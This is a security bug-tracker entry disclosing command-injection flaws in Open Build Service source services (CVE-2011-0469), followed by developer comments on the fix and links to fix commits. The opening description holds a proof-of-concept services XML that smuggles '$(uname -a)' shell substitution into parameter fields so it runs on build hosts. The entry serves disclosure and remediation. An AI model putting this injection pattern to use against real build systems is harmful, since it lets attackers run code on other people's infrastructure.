| [Description](show_bug.cgi?id=679325#c0)  Matthias Weckbecker   2011-03-14 10:50:33 UTC  ``` Adrian, as discussed last week the service-code contains various remote code execution vulnerabilities which allow attackers to execute arbitrary code on build systems with nobody-privileges.   Ludwig suggested to open a bug for the issue in order to keep it tracked.  POC:  Add the following service to your project to get access to a machine w/ internet connectivity:   <services>   <service name="download_url">     <param name="protocol">ftp</param>     <param name="host">cpan.myclash.net</param>     <param name="path">$(uname -a; exit 0)</param>   </service>   <service name="verify_file">     <param name="file">$(uname -a)</param>     <param name="verifier">md5</param>     <param name="checksum">645ea983242177e446d68905cb5ecda5</param>   </service>  </services> ``` [Comment 1](show_bug.cgi?id=679325#c1)  Ludwig Nussel   2011-03-14 10:59:31 UTC  ``` use CVE-2011-0469 ``` [Comment 2](show_bug.cgi?id=679325#c2)  Christian Dengler   2011-03-14 11:28:10 UTC  ``` The first script, I found this issue in, is fixed now (sr 64070).  But the other services, especially with network connection, contain a higher risk. ``` [Comment 3](show_bug.cgi?id=679325#c3)  Adrian Schröter   2011-03-14 11:31:33 UTC  ``` This was only possible when using the "experimental lxc wrapper for additional security ;)". This is fixed now. I will include the fix in next 2.1 release, but I have some serious doubts that anyone else ever used the LXC wrapper (because it is quite tricky to get it working anyway). ``` [Comment 4](show_bug.cgi?id=679325#c4)  Adrian Schröter   2011-03-14 11:33:19 UTC  ``` [Comment 2](show_bug.cgi?id=679325#c2): The problem was not the particular service, it was buggy, but safe. The problem was the lxc wrapper script (only used on server side so far). ``` [Comment 5](show_bug.cgi?id=679325#c5)  Marcus Meissner   2017-08-02 15:54:06 UTC  ``` main fix is in: <https://github.com/openSUSE/open-build-service/commit/76b0ab003f34435ca90d943e02dd22279cdeec2a>  secondary fix in:  <https://github.com/openSUSE/open-build-service/commit/23c8d21c75242999e29379e6ca8418a14c8725c6> ``` [Comment 6](show_bug.cgi?id=679325#c6)  Marcus Meissner   2017-08-02 15:58:24 UTC  ``` no official announcemnet on openbuildservice.org. ``` |  |
